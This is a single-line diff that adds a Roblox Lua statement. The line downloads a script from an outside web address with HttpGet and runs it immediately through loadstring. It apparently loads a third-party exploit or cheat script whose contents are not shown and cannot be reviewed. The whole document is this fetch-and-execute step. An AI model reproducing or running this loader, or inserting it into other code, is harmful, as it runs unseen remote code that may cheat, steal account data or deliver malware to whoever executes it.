@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://sentinel1.vercel.app/get/main.lua"))()
